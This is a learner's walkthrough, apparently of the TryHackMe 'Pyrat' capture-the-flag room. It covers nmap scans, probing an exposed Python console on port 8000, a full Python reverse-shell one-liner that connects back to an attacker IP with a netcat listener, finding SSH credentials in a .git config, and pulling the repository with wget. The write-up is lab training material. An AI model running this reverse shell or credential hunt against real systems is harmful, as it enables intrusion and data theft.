</br> starting with basic scans as always
</br>nmap -p- -T4 10.10.253.61 -v
```
PORT     STATE SERVICE
22/tcp   open  ssh
8000/tcp open  http-alt
MAC Address: 02:BB:4C:C8:2F:81 (Unknown)
```
</br> expand into depth scan `nmap 22 8000 -A -T4 <ip> -v`
```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http-alt SimpleHTTP/0.6 Python/3.11.2
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, JavaRMI, LANDesk-RC, NotesRPC, Socks4, X11Probe, afp, giop: 
|     source code string cannot contain null bytes
|   FourOhFourRequest, LPDString, SIPOptions: 
|     invalid syntax (<string>, line 1)
|   GetRequest: 
|     name 'GET' is not defined
|   HTTPOptions, RTSPRequest: 
|     name 'OPTIONS' is not defined
|   Help: 
|_    name 'HELP' is not defined
|_http-favicon: Unknown favicon MD5: FBD3DB4BEF1D598ED90E26610F23A63F
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: SimpleHTTP/0.6 Python/3.11.2
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
```

</br> worthy of note: running: Python/3.11.2 on that weird 8000 port
</br> 8000 is some kind of http, so might be viewable in web browser
![oddTes800](https://github.com/user-attachments/assets/ed94347e-4649-457b-a3c7-a30abc85649c)
</br> cute, it tells us we should so something simpler.
</br> I can try to get the url data in network settings, then right clicking to get the menu as shown, then get curl data.
</br> I essentially want to try and get the URL data, but in a more bare-bones way.
![iterations324234](https://github.com/user-attachments/assets/7cbb0ad9-7443-4b55-a5cb-6d80aba1b7ff)

```
curl 'http://10.10.253.61:8000/' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Priority: u=0, i'
``
</br> still telling us to try something more basic
</br> trim away all header information, just make it blank, is that "more basic" ?
```
 curl 'http://pyrat.thm:8000/' -H 'User-Agent:' -H 'Accept:' -H 'Accept-Language:' -H 'Accept-Encoding:' -H 'Connection:' -H 'Upgrade-Insecure-Requests:' -H 'Host:--http0.9'
```

</br>screencap shows a couple of times I tried simplifying it, but removing the information after the colons : in each header field seems to be the "answer" that changed the response... but then it says it cannot resolve the host
</br> pyrat.thm is the target site... it's like an internal header for the site
![iterations324234](https://github.com/user-attachments/assets/caf8958e-0dd9-46a0-ad45-8d97a3bdc691)

</br> Brick wall...
</br> What is simpler than getting data by curl?
</br> a net-cat to that port? Since that's a simple connection?
</br> I saw on the nmap -A scan that the 8000 port is running python... so I try an f-string to see if python3 is indeed running, and it seems so.
</br> let's try writing a python reverse shell
```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.200.159",1776));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
```
</br> above, 10.10.200.159 and 1776 are the attack ip and the listening port I'm going to set my attacker netcat session to (another nc session, not the one we're using to access the 8000 port with the invisible python console)
</br> 
</br> before launching, I need to set up a listener in a new tab
</br> `nc -nvlp 1776`
![fudgeDrop](https://github.com/user-attachments/assets/830e386c-91d6-41b0-b400-ab5edc8f3807)
</br> go back to the first tab and punch in the python command to launch the reverse shell
![rewngonerg](https://github.com/user-attachments/assets/6517b8ed-9075-45ec-88c7-4240b93bc530)

</br> Note `ls` doesn't work in the python terminal, you walnut, the new shell opens in the second nc session
</br> I'm handing off the access to the reverse shell by exploiting the python console available on port 8000
</br>cannot read files or do any enumeration by looking for sudo -l
![fudgeDrop](https://github.com/user-attachments/assets/3d65cd50-a67a-49a1-9a74-4130fec750a4)

</br>dang it, lost the session trying to skip over the logout garbage
</br>boot up the session with that whole 3-ring circus again, and see what perms I got with `find / -perm -4000 2>/dev/null` but nothing is out of the ordinary.
</br>move to /tmp because I should at least be able to write stuff from there. 
</br>Wait, there's stuff in temp?

can't open...

check other standard area /opt
there's /opt/dev with a .git collection? Is this guy a coder with a github repo?

read through the config and we get credentials, we can now ssh

ssh think@<ip>
use the password we found
(simpler connection to target machine as the user "think")

I wanna get this .git repo, so set up a pythons erver:

python3 -m http.server 1812
Serving HTTP on 0.0.0.0 port 1812 (http://0.0.0.0:1812/) ...
(as usual, the port, 1812, is arbitrary)

then download it all with a wget request

wget -r http://10.10.253.61:1812

I'm stupid and saved the git repo as the ip address and 1812 port number as the dir name....

critical error:
```Changes not staged for commit:
  (use "git add/rm <file>..." to update what will be committed)
  (use "git restore <file>..." to discard changes in working directory)
	deleted:    pyrat.py.old

Untracked files:
  (use "git add <file>..." to include in what will be committed)
	index.html
```
^^^ the copied test from the terminal shows pyrat.py.old, but the stupid terminal itself doesn't show his cricital deleted file! 

let's restore it
full text of the data.... 
```
def switch_case(client_socket, data):
    if data == 'some_endpoint':
        get_this_enpoint(client_socket)
    else:
        # Check socket is admin and downgrade if is not aprooved
        uid = os.getuid()
        if (uid == 0):
            change_uid()

        if data == 'shell':
            shell(client_socket)
        else:
            exec_python(client_socket, data)

def shell(client_socket):
    try:
        import pty
        os.dup2(client_socket.fileno(), 0)
        os.dup2(client_socket.fileno(), 1)
        os.dup2(client_socket.fileno(), 2)
        pty.spawn("/bin/sh")
    except Exception as e:
        send_data(client_socket, e)
```

none of that makes any sense ot me

/var/mail has email?

from email, we get a hint that just typing admin on the port 8000 asks for a password... or we could read that from the old version of the file
....

brute force it with python gimmick code from https://hackmd.io/@nicl4ssic/tryhackme-pyrat-walkthrough

(it's just connecting to netcat and trying passwords, really not teaching anything meaningful for me, so I skip it)
